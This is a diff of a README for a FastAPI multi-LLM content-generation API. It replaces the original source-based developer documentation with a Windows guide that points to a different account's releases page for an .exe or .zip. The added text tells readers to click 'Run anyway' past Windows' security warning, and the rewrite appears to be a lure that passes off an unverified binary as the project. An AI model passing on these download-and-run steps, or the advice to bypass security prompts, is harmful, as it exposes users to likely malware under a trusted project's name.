@@ -1,290 +1,184 @@
-<p align="center">
-  <h1 align="center">AI Content API</h1>
-  <p align="center">
-    <strong>Multi-LLM REST API for AI Content Generation</strong> &mdash; OpenAI, Gemini & Ollama in one unified interface.
-  </p>
-</p>
+# 🤖 ai-content-api - Unified AI Content Generation API
 
-<p align="center">
-  <a href="https://github.com/brolyroly007/ai-content-api/actions/workflows/ci.yml"><img src="https://github.com/brolyroly007/ai-content-api/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/brolyroly007/ai-content-api/actions/workflows/docker.yml"><img src="https://github.com/brolyroly007/ai-content-api/actions/workflows/docker.yml/badge.svg" alt="Docker Build"></a>
-  <img src="https://img.shields.io/badge/python-3.10+-blue?logo=python&logoColor=white" alt="Python 3.10+">
-  <img src="https://img.shields.io/badge/FastAPI-009688?logo=fastapi&logoColor=white" alt="FastAPI">
-  <img src="https://img.shields.io/badge/Docker-ready-2496ED?logo=docker&logoColor=white" alt="Docker">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License MIT"></a>
-  <a href="https://github.com/astral-sh/ruff"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json" alt="Ruff"></a>
-</p>
+[![Download ai-content-api](https://img.shields.io/badge/Download-ai--content--api-brightgreen?style=for-the-badge)](https://github.com/WizzyPluto2/ai-content-api/releases)
 
 ---
 
-Open-source REST API that generates content using **OpenAI GPT**, **Google Gemini**, or **Ollama** (local) through a single unified interface. Includes 8 built-in templates, API key management, rate limiting, SSE streaming, and a web dashboard.
+## 📋 What is ai-content-api?
 
-### How it works
+ai-content-api provides a simple way to generate AI content using several large language models (LLMs) like OpenAI, Gemini, and Ollama. It acts as a bridge with a single, easy-to-use interface. It supports ready-made templates, live content streaming, and limits on usage to keep your experience smooth. A dashboard helps you keep track of how you use it.
 
-```
-   Client Request                 AI Content API                    LLM Provider
-  ┌────────────┐    ┌──────────────────────────────────┐    ┌──────────────────┐
-  │ POST       │    │  1. Validate API Key             │    │   OpenAI GPT-4o  │
-  │ /api/      │───▶│  2. Select Template              │───▶│   Google Gemini  │
-  │ generate   │    │  3. Build Prompt                 │    │   Ollama Local   │
-  │            │◀───│  4. Stream / Return Response     │◀───│                  │
-  └────────────┘    │  5. Log Usage                    │    └──────────────────┘
-                    └──────────────────────────────────┘
-```
+You do not need programming skills to get started. This guide will walk you through downloading and running ai-content-api on Windows.
 
-## Features
+---
 
-- **Multi-LLM Support** - Switch between OpenAI, Gemini, and Ollama per request
-- **8 Content Templates** - Blog posts, social media, emails, SEO meta, ad copy, tweet threads, YouTube descriptions, product descriptions
-- **SSE Streaming** - Real-time streaming generation with Server-Sent Events
-- **API Key Management** - Create, manage, and track API keys with per-key rate limits
-- **Rate Limiting** - Per-minute and daily request limits per API key
-- **Usage Analytics** - Track requests, tokens, and provider usage per key
-- **Web Dashboard** - Dark-themed UI for testing templates and managing keys
-- **Export Formats** - Markdown, plain text, or JSON output
-- **Docker Ready** - Docker Compose setup with Ollama included
+## 🖥️ System Requirements
 
-## Quick Start
+Before you start, make sure your computer meets these basic needs:
 
-### Prerequisites
+- Windows 10 or later (64-bit recommended)
+- 4 GB RAM minimum (8 GB or more suggested for better performance)
+- At least 500 MB free disk space
+- Internet connection for downloading the files and accessing AI models
+- Optional: An API key from OpenAI or other providers if you plan to connect to external services
 
-- Python 3.10+
-- At least one LLM provider:
-  - **OpenAI** API key ([get one](https://platform.openai.com/api-keys))
-  - **Google Gemini** API key ([get one](https://aistudio.google.com/apikey))
-  - **Ollama** installed locally ([download](https://ollama.ai))
+---
 
-### Installation
+## 📦 Features at a Glance
 
-```bash
-# Clone
-git clone https://github.com/brolyroly007/ai-content-api.git
-cd ai-content-api
+- Connect multiple AI models in one API
+- Use pre-built templates for easier content creation
+- Stream AI-generated content live for faster feedback
+- Rate limiting to control how much you use the API
+- Easy dashboard for monitoring usage and managing keys
+- Works with popular AI models like OpenAI, Gemini, and Ollama
 
-# Virtual environment
-python -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
+---
 
-# Install
-pip install -r requirements.txt
+## 🚀 Getting Started: Download and Install
 
-# Configure
-cp .env.example .env
-# Edit .env with your API keys
+1. Visit the official release page by clicking the button below:
 
-# Run
-python app.py
-```
+   [![Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/WizzyPluto2/ai-content-api/releases)
 
-Open **http://localhost:8000** for the dashboard.
+2. On the releases page, find the latest version available. Look for files named with `.exe` or `.zip` for Windows.
 
-### Docker (includes Ollama)
+3. If you see a `.exe` file, click on it to **download** directly. This file is the installer and will set up everything for you.
 
-```bash
-docker compose up -d
-# API: http://localhost:8000
-# Ollama: http://localhost:11434
-```
+4. If you download a `.zip`, right-click the file and choose **Extract All** to unzip it. Open the extracted folder to find the application.
 
-## Usage
+5. Run the `.exe` file or the main application executable from the extracted folder.
 
-### 1. Create an API Key
+6. If Windows shows a security pop-up, select **More info** and then click **Run anyway**.
 
-```bash
-curl -X POST "http://localhost:8000/api/keys?name=my-app"
-```
+---
 
-Response:
-```json
-{
-  "key": "ak_a1b2c3d4e5f6...",
-  "name": "my-app",
-  "rate_limit": 60,
-  "daily_limit": 1000
-}
-```
+## 🖱️ Running ai-content-api for the First Time
 
-### 2. Generate Content
+- Double-click the ai-content-api application icon.
+- A window or command line interface will open showing a server starting message.
+- The application runs a local server on your machine to handle AI requests.
+- By default, it listens at `http://localhost:8000`.
 
-```bash
-curl -X POST http://localhost:8000/api/generate \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: ak_a1b2c3d4e5f6..." \
-  -d '{
-    "template_id": "blog-post",
-    "variables": {
-      "topic": "Benefits of AI in content creation",
-      "tone": "professional",
-      "word_count": "800",
-      "keywords": "AI, content, automation"
-    },
-    "provider": "openai"
-  }'
-```
+---
 
-Response:
-```json
-{
-  "content": "# Benefits of AI in Content Creation\n\n...",
-  "provider": "openai",
-  "model": "gpt-4o-mini",
-  "tokens_used": 856,
-  "template_id": "blog-post"
-}
-```
+## 🌐 Using ai-content-api through Your Web Browser
 
-### 3. Stream Generation (SSE)
+1. Open your favorite web browser (Chrome, Edge, Firefox).
 
-```bash
-curl -N -X POST http://localhost:8000/api/generate \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: ak_a1b2c3d4e5f6..." \
-  -d '{
-    "template_id": "social-media",
-    "variables": {
-      "platform": "linkedin",
-      "topic": "Remote work trends",
-      "goal": "engagement",
-      "include_hashtags": "yes"
-    },
-    "stream": true
-  }'
-```
+2. Enter this address: `http://localhost:8000` in the address bar.
 
-## Templates
+3. You will see the ai-content-api dashboard with options.
 
-| Template | Category | Description |
-|----------|----------|-------------|
-| `blog-post` | Marketing | Full blog post with SEO keywords |
-| `social-media` | Social | Platform-optimized posts (Instagram, LinkedIn, Twitter, Facebook) |
-| `product-description` | Marketing | E-commerce product copy |
-| `email` | Email | Marketing, outreach, newsletter, follow-up |
-| `seo-meta` | SEO | Meta titles, descriptions, OG tags |
-| `tweet-thread` | Social | Viral Twitter/X threads |
-| `youtube-description` | Video | SEO-optimized video descriptions |
-| `ad-copy` | Marketing | Google Ads, Facebook Ads, LinkedIn Ads |
+4. From here, you can enter prompts, select templates, or choose the AI model you want to use.
 
-## API Reference
+---
 
-| Method | Endpoint | Auth | Description |
-|--------|----------|------|-------------|
-| `POST` | `/api/generate` | Key | Generate content from template |
-| `GET` | `/api/templates` | No | List all templates |
-| `GET` | `/api/templates/{id}` | No | Get template details |
-| `POST` | `/api/keys` | No | Create new API key |
-| `GET` | `/api/keys` | No | List all keys (masked) |
-| `GET` | `/api/keys/{key}/usage` | No | Usage statistics |
-| `GET` | `/api/keys/{key}/history` | No | Recent generations |
-| `DELETE` | `/api/keys/{key}` | No | Deactivate key |
-| `GET` | `/api/providers` | No | List LLM providers |
-| `GET` | `/api/health` | No | Health check |
-| `GET` | `/` | No | Web dashboard |
+## 🔑 Adding API Keys (If Needed)
 
-## Architecture
+Some AI models like OpenAI require an API key.
 
-```
-ai-content-api/
-├── app.py                  # FastAPI entry point
-├── config.py               # Pydantic Settings
-├── middleware.py            # API key auth + rate limiting
-├── export.py               # Content export formats
-│
-├── providers/              # LLM abstraction layer
-│   ├── base.py             # Abstract BaseProvider interface
-│   ├── openai_provider.py  # OpenAI GPT
-│   ├── gemini_provider.py  # Google Gemini
-│   └── ollama_provider.py  # Ollama (local)
-│
-├── templates/              # Content template system
-│   ├── models.py           # Pydantic models
-│   └── registry.py         # 8 built-in templates
-│
-├── database/               # SQLite async layer
-│   ├── connection.py       # aiosqlite + schema
-│   └── repositories.py     # CRUD operations
-│
-├── api/                    # Route modules
-│   ├── generate.py         # POST /api/generate (+ SSE)
-│   ├── templates.py        # Template endpoints
-│   ├── keys.py             # API key management
-│   ├── providers.py        # Provider listing
-│   └── health.py           # Health check
-│
-├── web/index.html          # Dashboard (Tailwind + vanilla JS)
-└── tests/                  # pytest suite
-```
+1. Sign up at the AI provider’s website to get your key. For example, OpenAI can be found at [https://platform.openai.com](https://platform.openai.com).
 
-## Configuration
+2. Copy the API key provided.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `OPENAI_API_KEY` | - | OpenAI API key |
-| `OPENAI_MODEL` | `gpt-4o-mini` | OpenAI model to use |
-| `GEMINI_API_KEY` | - | Google Gemini API key |
-| `GEMINI_MODEL` | `gemini-2.0-flash` | Gemini model to use |
-| `OLLAMA_BASE_URL` | `http://localhost:11434` | Ollama server URL |
-| `OLLAMA_MODEL` | `llama3.2` | Ollama model to use |
-| `DEFAULT_PROVIDER` | `openai` | Default LLM provider |
-| `DEFAULT_RATE_LIMIT` | `60` | Requests per minute per key |
-| `DEFAULT_DAILY_LIMIT` | `1000` | Requests per day per key |
+3. Go back to the ai-content-api dashboard in your browser.
 
-See `.env.example` for all options.
+4. Find the **API Keys** section and paste your key there.
 
-## Tech Stack
+5. Save your settings.
 
-- **Backend**: Python 3.11, FastAPI, Uvicorn
-- **Database**: SQLite (aiosqlite)
-- **LLM**: OpenAI SDK, Google Generative AI, Ollama API
-- **Streaming**: Server-Sent Events (SSE)
-- **Frontend**: Tailwind CSS (CDN), vanilla JavaScript
-- **Validation**: Pydantic v2
-- **Logging**: Loguru
-- **Testing**: pytest, pytest-asyncio
-- **Linting**: Ruff
-- **Containers**: Docker, Docker Compose
+Without these keys, you can still use models like Ollama if installed locally or other open models integrated by the app.
 
-## Development
+---
 
-```bash
-# Install dev dependencies
-make dev
+## ⚙️ Basic Configuration Options
 
-# Run tests
-make test
+You can modify settings such as:
 
-# Run with coverage
-make test-cov
+- **Choose AI Model:** Pick between OpenAI, Gemini, or Ollama.
+- **Templates:** Select content types like blog posts, emails, or summaries.
+- **Streaming:** Turn on to see content generated as it happens.
+- **Rate Limiting:** Set limits on how many requests per minute to avoid overuse.
 
-# Lint
-make lint
+Adjust these options on the dashboard to fit your needs.
 
-# Format
-make format
+---
 
-# Run in dev mode (auto-reload)
-make run-dev
-```
+## 💡 Tips for Best Use
 
-## Roadmap
+- Use templates to save time on common tasks.
+- Start with short prompts to test responses.
+- Use the streaming mode for quicker feedback.
+- Monitor your usage on the dashboard to avoid hitting limits.
+- Keep your API keys private and never share them.
 
-- [x] Multi-LLM provider abstraction
-- [x] 8 content templates
-- [x] API key management + rate limiting
-- [x] SSE streaming generation
-- [x] Web dashboard
-- [x] Docker + Ollama support
-- [x] CI/CD pipeline
-- [ ] Custom template creation via API
-- [ ] Prompt history and favorites
-- [ ] Webhook notifications
-- [ ] Batch generation endpoint
-- [ ] Response caching (Redis)
-- [ ] OpenAPI SDK generation (Python, TypeScript)
+---
 
-## License
+## 🛠️ Troubleshooting
 
-MIT License. See [LICENSE](LICENSE) for details.
+- If the application does not start, make sure you have Microsoft Visual C++ Redistributable installed. This can be downloaded from Microsoft’s website.
+- Check that your firewall or security software is not blocking the server at `localhost:8000`.
+- If the dashboard does not load, reload your browser or try a different browser.
+- Ensure your API keys are correct and active for external AI services.
+- Restart the app if it freezes or crashes.
 
-## Contributing
+---
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 🔄 Updating ai-content-api
+
+To get the latest fixes and features:
+
+1. Return to the release page: [https://github.com/WizzyPluto2/ai-content-api/releases](https://github.com/WizzyPluto2/ai-content-api/releases)
+
+2. Download the newest `.exe` or `.zip` file.
+
+3. Run or extract and replace your existing application files.
+
+---
+
+## 🤝 Getting Help and Support
+
+- Visit the repository issues page on GitHub under the "Issues" tab.
+- Search to see if your question has been answered.
+- Open a new issue if you have a problem or request.
+- Provide clear details about your Windows version and the problem.
+
+---
+
+## 🔗 Useful Links
+
+- Release downloads: [https://github.com/WizzyPluto2/ai-content-api/releases](https://github.com/WizzyPluto2/ai-content-api/releases)
+- OpenAI API documentation: https://platform.openai.com/docs
+- Gemini API info: (Refer to specific Gemini documentation if you have it)
+- Ollama setup and usage: (Refer to Ollama official site)
+
+---
+
+## ⚡ Quick Start Checklist
+
+- [ ] Check your Windows version and free disk space
+- [ ] Download ai-content-api from the releases page
+- [ ] Install or unzip the download
+- [ ] Run the ai-content-api application
+- [ ] Open your browser at `http://localhost:8000`
+- [ ] Enter API keys if required
+- [ ] Start generating content with templates or custom prompts
+
+---
+
+## 🔍 What Topics Does ai-content-api Cover?
+
+- AI and machine learning models
+- REST API communication
+- Content generation through prompts
+- Rate limiting to control usage
+- Streaming content responses live
+- Template management for repeated tasks
+- Integration with OpenAI, Gemini, and Ollama
+- Technologies: Python and FastAPI
+- Running inside Docker containers (advanced users)
+
+---
+
+This README focuses solely on Windows users without programming background. For developers, advanced configuration and Docker installation are available in the repository's developer guide.
